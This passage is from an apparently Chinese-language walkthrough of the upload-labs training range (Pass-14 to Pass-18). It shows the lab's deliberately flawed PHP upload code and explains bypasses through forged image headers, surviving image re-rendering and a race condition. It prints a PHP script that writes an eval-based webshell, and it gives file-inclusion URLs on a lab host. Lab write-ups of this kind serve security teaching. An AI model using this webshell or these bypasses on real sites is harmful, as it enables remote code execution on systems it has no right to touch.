punctuation">}</span>$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $res <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>$res<span class="token punctuation">)</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$res<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-13"><a href="#解题思路-13" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><p>这里使用<code>getimagesize()</code>检查是否为图片文件：</p></li><li><p><code>getimagesize()</code> 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 <code>FALSE</code> 并产生一条 <code>E_WARNING</code> 级的错误信息。示例：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token string">"images/flower_1.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>返回结果：</p><pre class=" language-php"><code class="language-php"><span class="token keyword">Array</span><span class="token punctuation">(</span>    <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">350</span>    <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">318</span>    <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">2</span>    <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> width<span class="token operator">=</span><span class="token string">"350"</span> height<span class="token operator">=</span><span class="token string">"318"</span>    <span class="token punctuation">[</span>bits<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">8</span>    <span class="token punctuation">[</span>channels<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">3</span>    <span class="token punctuation">[</span>mime<span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> image<span class="token operator">/</span>jpeg<span class="token punctuation">)</span></code></pre><p>我们用到了索引[2],给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</p></li><li><p>与上一题解题思路一致，修改文件头绕过，但是本题的验证不只是文件头的前两位。</p></li></ul><h4 id="解题步骤-13"><a href="#解题步骤-13" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><p>与Pass-14解题方式一致，或者使用图片马合成方式进行（待验证）</p></li><li><p>利用文件包含漏洞访问上传文件，<a href="http://192.168.2.104/include.php?file=upload/5120200907005027.gif成功" target="_blank" rel="noopener">http://192.168.2.104/include.php?file=upload/5120200907005027.gif成功</a>~</p></li></ul><h3 id="Pass-15-exif-imagetype"><a href="#Pass-15-exif-imagetype" class="headerlink" title="Pass-15 exif_imagetype"></a>Pass-15 exif_imagetype</h3><h4 id="提示与查看源码-14"><a href="#提示与查看源码-14" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass使用exif_imagetype()检查是否为图片文件！</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">isImage</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//需要开启php_exif模块</span>    $image_type <span class="token operator">=</span> <span class="token function">exif_imagetype</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>$image_type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> IMAGETYPE_GIF<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"gif"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> IMAGETYPE_JPEG<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"jpg"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> IMAGETYPE_PNG<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"png"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $res <span class="token operator">=</span> <span class="token function">isImage</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>$res<span class="token punctuation">)</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span>$res<span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-14"><a href="#解题思路-14" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><code>exif_imagetype()</code>函数是php内置函数，用来获取图片类型，思路同上题，文件头绕过</li></ul><h4 id="解题步骤-14"><a href="#解题步骤-14" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li>同<code>Pass-14</code></li></ul><h3 id="Pass-16-二次渲染绕过"><a href="#Pass-16-二次渲染绕过" class="headerlink" title="Pass-16 二次渲染绕过"></a>Pass-16 二次渲染绕过</h3><h4 id="提示与查看源码-15"><a href="#提示与查看源码-15" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>本pass重新渲染了图片！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span>    $filename <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $filetype <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $tmpname <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $target_path<span class="token operator">=</span>UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token function">basename</span><span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 获得上传文件的扩展名</span>    $fileext<span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span>$filename<span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断文件后缀与类型，合法才进行上传操作</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>$fileext <span class="token operator">==</span> <span class="token string">"jpg"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>$filetype<span class="token operator">==</span><span class="token string">"image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$tmpname<span class="token punctuation">,</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用上传的图片生成新的图片</span>            $im <span class="token operator">=</span> <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>$im <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">"该文件不是jpg格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                $newfilename <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".jpg"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span>$newfilename<span class="token punctuation">;</span>                <span class="token function">imagejpeg</span><span class="token punctuation">(</span>$im<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>$fileext <span class="token operator">==</span> <span class="token string">"png"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>$filetype<span class="token operator">==</span><span class="token string">"image/png"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$tmpname<span class="token punctuation">,</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用上传的图片生成新的图片</span>            $im <span class="token operator">=</span> <span class="token function">imagecreatefrompng</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>$im <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">"该文件不是png格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                 <span class="token comment" spellcheck="true">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                $newfilename <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span>$newfilename<span class="token punctuation">;</span>                <span class="token function">imagepng</span><span class="token punctuation">(</span>$im<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                           <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>$fileext <span class="token operator">==</span> <span class="token string">"gif"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>$filetype<span class="token operator">==</span><span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$tmpname<span class="token punctuation">,</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//使用上传的图片生成新的图片</span>            $im <span class="token operator">=</span> <span class="token function">imagecreatefromgif</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>$im <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                $msg <span class="token operator">=</span> <span class="token string">"该文件不是gif格式的图片！"</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//给新图片指定文件名</span>                <span class="token function">srand</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                $newfilename <span class="token operator">=</span> <span class="token function">strval</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".gif"</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span>                $img_path <span class="token operator">=</span> UPLOAD_PATH<span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span>$newfilename<span class="token punctuation">;</span>                <span class="token function">imagegif</span><span class="token punctuation">(</span>$im<span class="token punctuation">,</span>$img_path<span class="token punctuation">)</span><span class="token punctuation">;</span>                @<span class="token function">unlink</span><span class="token punctuation">(</span>$target_path<span class="token punctuation">)</span><span class="token punctuation">;</span>                $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"上传出错！"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">"只允许上传后缀为.jpg|.png|.gif的图片文件！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li>程序通过<code>imagecreatefromjpeg()</code>函数调用了PHP GD库（GD库，是php处理图形的扩展库），对图片进行了转换。</li><li>将一个正常显示的图片，上传到服务器。下载被渲染后与原始图片对比，在仍然相同的数据块部分内部插入Webshell代码，然后上传。</li><li><a href="https://www.freebuf.com/articles/web/54086.html" target="_blank" rel="noopener">特殊的上传技巧，绕过PHP图片转换实现远程代码执行</a></li><li>大佬解题：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a></li></ul><h4 id="解题步骤-15"><a href="#解题步骤-15" class="headerlink" title="解题步骤"></a>解题步骤</h4><ul><li><a href="http://www.secgeek.net/POC/POC.gif" target="_blank" rel="noopener">http://www.secgeek.net/POC/PO…</a><br>使用链接中的图片上传</li></ul><h3 id="Pass-17-条件竞争"><a href="#Pass-17-条件竞争" class="headerlink" title="Pass-17 条件竞争"></a>Pass-17 条件竞争</h3><h4 id="提示与查看源码-16"><a href="#提示与查看源码-16" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>需要代码审计！</p></blockquote><pre class=" language-js"><code class="language-js">$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    $ext_arr <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'jpg'</span><span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">,</span><span class="token string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $file_name <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $temp_file <span class="token operator">=</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $file_ext <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span>$file_name<span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $upload_file <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> $file_name<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>$temp_file<span class="token punctuation">,</span> $upload_file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span>$file_ext<span class="token punctuation">,</span>$ext_arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             $img_path <span class="token operator">=</span> UPLOAD_PATH <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span>$file_ext<span class="token punctuation">;</span>             <span class="token function">rename</span><span class="token punctuation">(</span>$upload_file<span class="token punctuation">,</span> $img_path<span class="token punctuation">)</span><span class="token punctuation">;</span>             $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            $msg <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            <span class="token function">unlink</span><span class="token punctuation">(</span>$upload_file<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        $msg <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h4><ul><li><code>unlink()</code> 函数删除文件。</li><li>这里先将文件保存在服务器中，再判断后缀名，若后缀名不合法则删除文件</li><li>通过条件竞争的方式在<code>unlink</code>之前，访问上传文件。</li><li>利用条件竞争删除文件时间差绕过。</li></ul><h4 id="解题步骤-16"><a href="#解题步骤-16" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>​    通过BP上传mkshell.php文件数据包，进行大量重放，再通过浏览器访问来文件生成shell.php文件.</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Unable to open file!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> '<span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"Do it !"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;br />"</span><span class="token punctuation">;</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>'<span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token delimiter">?></span></code></pre><p><img src="http://106.52.86.96/202009060800/image-20200907014610430.png" alt=""></p><p><img src="http://106.52.86.96/202009060800/image-20200907014649149.png" alt=""></p><ul><li>访问<a href="http://192.168.2.104/upload/shell.php成功" target="_blank" rel="noopener">http://192.168.2.104/upload/shell.php成功</a>~</li></ul><h3 id="Pass-18-审计代码"><a href="#Pass-18-审计代码" class="headerlink" title="Pass-18 审计代码"></a>Pass-18 审计代码</h3><h4 id="提示与查看源码-17"><a href="#提示与查看源码-17" class="headerlink" title="提示与查看源码"></a>提示与查看源码</h4><blockquote><p>需要代码审计！</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">//index.php</span>$is_upload <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>$msg <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">require_once</span><span class="token punctuation">(</span><span class="token string">"./myupload.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $imgFileName <span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    $u <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MyUpload</span><span class="token punctuation">(</span>$_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $_FILES<span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>$imgFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>    $status_code <span class="token operator">=</span> $u<span class="token operator">-</span><span class="token operator">></span><span class="token function">upload</span><span class="token punctuation">(</span>UPLOAD_PATH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span>$status_code<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            $is_upload <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            $img_path <span class="token operator">=</span> $u<span class="token operator">-</span><span class="token operator">></span>cls_upload_dir <span class="token punctuation">.</span> $u<span class="token operator">-</span><span class="token operator">></span>cls_file_rename_to<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            $msg <span class="token operator">=</span> <span class="token string">'文件已经被上传，但没有重命名。'</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>         <span class="token keyword">case</span> <span class="token 